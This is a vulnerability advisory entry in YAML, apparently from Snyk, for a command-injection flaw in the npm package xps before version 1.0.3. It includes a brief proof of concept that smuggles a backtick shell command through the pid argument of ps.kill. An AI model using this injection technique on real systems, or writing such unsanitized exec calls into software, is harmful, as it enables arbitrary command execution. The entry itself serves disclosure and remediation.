---
- id: snykio:npm:xps:590098
  title: Command Injection
  description: "[xps][1] is a cross-platform library for listing and killing processes.\n\nAffected
    versions of this package are vulnerable to Command Injection.\nThe argument `pid`
    is used to build the command that is passed to the\n`child_process.exec` function
    without any sanitization.\n\n### PoC by Alessio (d3lla)   {#poc-by-alessio-d3lla}\n\n1.
    \ create a directory for testing\n    \n        mkdir poc\n        cd poc/\n\n2.
    \ install latest vulnerable xps module (v1.0.2): `npm i xps@1.0.2`\n\n3.  create
    the following PoC JavaScript file (`poc.js`):\n    \n        const ps = require('xps');\n
    \       ps.kill('`touch HACKED;`').fork();\n\n4.  make sure that the HACKED file
    does not exist: `ls`\n\n5.  execute the `poc.js` file: `node poc.js`\n\n6.  the
    HACKED file is created: `ls`\n    \n    ## Remediation   {#remediation}\n    \n
    \   Upgrade `xps` to version 1.0.3 or higher.\n    \n    ## References   {#references}\n\n*
    [GitHub Commit][2]\n* [HackerOne Report][3]\n* [Vulnerable Code][4]\n\n\n\n[1]:
    https://www.npmjs.com/package/xps\n[2]: https://github.com/sorellabs/xps/commit/768481146b8ead3811310eecc0f56e2d107cb740\n[3]:
    https://hackerone.com/reports/865168\n[4]: https://github.com/sorellabs/xps/blob/b6d819e95676dababe6c846e214cbf3313b6cd3f/lib/linux.js#L48\n"
  affected_package: xps
  vulnerable_versions:
  - "<1.0.3"
  severity: high
  package_manager: npm
  cwe:
  - CWE-78
  disclosed_date: 2020-07-23
  created_date: 2020-07-24
  last_modified_date: 2020-07-24
  credit:
  - d3lla
  source_url: https://snyk.io/vuln/SNYK-JS-XPS-590098
